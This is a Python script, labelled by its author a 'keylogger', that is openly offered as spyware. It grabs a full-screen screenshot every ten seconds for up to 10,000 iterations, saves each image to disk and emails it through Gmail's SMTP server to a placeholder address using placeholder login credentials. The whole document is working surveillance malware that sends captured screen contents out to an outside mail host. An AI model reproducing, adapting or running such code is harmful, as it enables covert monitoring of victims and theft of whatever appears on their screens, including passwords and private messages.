import pyscreenshot as ImageGrab
import time
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
from email.MIMEImage import MIMEImage
import os
import smtplib
time.sleep(1)
print("-------[Created By AbdXSlayer]-------")
print("YOU SHOULD READ THE README FILE !!!!")
time.sleep(1)
if __name__ == "__main__":
    i = 1
    x = 10000
    for i in range(x):
        i = i+1
        im=ImageGrab.grab()
        name = ('Image',i,'.png')
        names = "%s%s%s"%(name)
        name = "%s%s%s"%(name)
        im.save(names)
        strFrom = 'youremail'
        strTo = 'youremail@gmail.com'
        msgRoot = MIMEMultipart('related')
        msgRoot['Subject'] = 'IMAGE KEYLOGGER'
        msgRoot['From'] = strFrom
        msgRoot['To'] = strTo
        msgRoot.preamble = 'KEYLOGGER BY ABDXSLAYER !'

        msgAlternative = MIMEMultipart('alternative')
        msgRoot.attach(msgAlternative)

        msgText = MIMEText('GOOD WORK')
        msgAlternative.attach(msgText)
        msgText = MIMEText('<b>CONGRATS !</b>', 'html')
        msgAlternative.attach(msgText)
        slash = '\ '
        imint = "Image",i
        imint = "%s%s"%(imint)
        path = 'C:\Users\Abdx\Desktop\Programmes'+slash+imint+'.png'
        path = path.replace(" ","")
        fp = open(path, 'rb')
        msgImage = MIMEImage(fp.read())
        fp.close()
        msgImage.add_header('Content-ID', name)
        msgRoot.attach(msgImage)
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login("emailsender@gmail.com", "password")
        server.sendmail(strFrom, strTo, msgRoot.as_string())
        server.quit()
        time.sleep(10)
